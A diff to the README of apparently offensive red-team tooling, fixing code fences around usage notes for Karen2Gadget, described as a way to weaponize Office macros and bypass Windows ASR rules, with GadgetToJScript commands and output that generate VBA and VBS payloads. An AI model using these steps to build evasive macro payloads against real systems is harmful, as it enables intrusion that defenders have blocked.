@@ -164,7 +164,7 @@ C:\>KarenDumpedMi.exe
 Karen2Gadget is a boilerplate of KarenLdr designed to work compatibly with [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript). It can be used to automate Macro weaponization for bypassing ASR rules that block Win32 APIs.
 
 **NOTE:** Use `cscript.exe Karen2Gadget.vbs` to test the PoC.
-``
+```
 C:\>GadgetToJScript.exe -c Karen2Gadget\Program.cs -o Karen2Gadget -w vba -b -d System.dll
 [+]: Generating the vba payload
 [+]: First stage gadget generation done.
@@ -178,4 +178,4 @@ C:\>GadgetToJScript.exe -c Karen2Gadget\Program.cs -o Karen2Gadget -w vbs -b -d 
 [+]: Compiling your .NET code located at: Karen2Gadget\Program.cs
 [+]: Second stage gadget generation done.
 [*]: Payload generation completed, check: Karen2Gadget.vbs
-``
+```
